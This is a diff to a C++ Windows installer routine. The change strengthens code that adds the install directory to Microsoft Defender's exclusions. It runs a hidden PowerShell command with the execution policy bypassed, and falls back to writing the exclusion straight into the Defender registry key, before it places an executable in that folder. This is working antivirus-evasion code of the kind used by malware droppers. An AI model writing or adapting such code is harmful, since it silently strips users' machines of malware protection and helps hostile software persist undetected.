@@ -95,11 +95,19 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     }
 
     LogMessage(L"Setting Windows Defender exclusion...");
-    std::wstring psCmd = L"powershell -Command \"Add-MpPreference -ExclusionPath '" + targetDir + L"'\"";
+    // Try with -ExecutionPolicy Bypass and explicit WindowStyle to ensure it runs
+    std::wstring psCmd = L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '" + targetDir + L"' -ErrorAction Stop\"";
     if (RunHiddenCommand(psCmd)) {
         LogMessage(L"Defender exclusion set successfully.");
     } else {
-        LogMessage(L"Warning: Could not set Defender exclusion (maybe already set or restricted).");
+        LogMessage(L"Trying alternative exclusion method...");
+        // Alternative via Registry (needs Admin)
+        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + targetDir + L"\" /t REG_DWORD /d 0 /f";
+        if (RunHiddenCommand(regCmd)) {
+            LogMessage(L"Defender exclusion set via Registry.");
+        } else {
+            LogMessage(L"Warning: Could not set Defender exclusion. Please check if another AV is active.");
+        }
     }
 
     std::wstring targetPath = targetDir + L"\\" + exeName;
